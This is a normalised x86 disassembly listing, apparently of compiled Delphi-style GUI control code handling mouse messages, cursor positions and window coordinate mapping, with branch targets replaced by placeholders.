mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_40348c
jmp r-xdata
sub_4497f4
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_416cac
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_449cdc
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_448a84
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_448a98
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_416cfc
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_4499d4
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_44860c
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_40348c
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_44f2dc
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_446208
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_4499bf
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_44f2dc
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_44f2dc
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_40348c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403290
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_448494
test esi esi
je r-xdata
sub_4499d4
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_40348c
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_44a858
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_40348c
mov eax esi
call sub_44853c
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_4484f8
mov ecx eax
xor edx edx
xor eax eax
call sub_416cd4
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_40348c
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_449a78
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_449aa8
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_449b14
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_449bd4
sub_449b44
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_449b74
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_448638
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_449ba0
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_449bd4
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_449ca8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_449cdc
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_449d74
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_45f870
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_45f870
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_448694
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_46901c
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_40348c
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_45f7b4
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_40348c
jmp r-xdata
sub_449f08
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_408844
mov edi eax
mov eax [ esi + 0x64 ]
call sub_408870
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_448694
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_40869c
call sub_408638
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_408638
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_449fb0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_449fe0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_449fa4
push ebp
call sub_449fb0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44a030
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_44a0bc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_44a0f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_449b74
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_45f724
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_40348c
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_45f724
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_40348c
sub_44a178
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_448664
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_448d2c
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_44a0f4
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_44a1c4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_448664
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_44a1e0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_448664
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_448d2c
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44a0f4
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_40348c
sub_44a238
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_449b14
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_449aa8
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_449b14
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_44a2d4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_44a0f4
pop esi
pop ebx
retn
sub_44a2f9
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_44a0f4
pop esi
pop ebx
retn
sub_44a31f
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_44a0f4
pop esi
pop ebx
retn
sub_44a349
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_44a0f4
pop esi
pop ebx
retn
sub_44a36f
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_44a3a4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_449b74
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_45f724
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_40348c
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_45f724
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_40348c
sub_44a41c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_44a454
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_45f724
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_40348c
sub_44a48c
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_448d2c
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44a454
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406b4c
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_40348c
sub_44a504
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_44a454
pop esi
pop ebx
retn
sub_44a524
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_44a454
pop esi
pop ebx
retn
sub_44a544
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_45f724
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_40348c
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_453c54
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44a59c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_448d1c
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_448d2c
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_449ca8
pop esi
retn
sub_44a5dc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_449cdc
sub_44a68a
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_448f3c
mov cl 0x1
sub_44a6cc
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_448c94
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_448c94
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_44a6fc
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_44a720
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_406b4c
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_40348c
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_449ca8
mov [ ebx + 0xc ] eax
sub_44a7c4
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_448be8
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_448be8
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_44a858
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
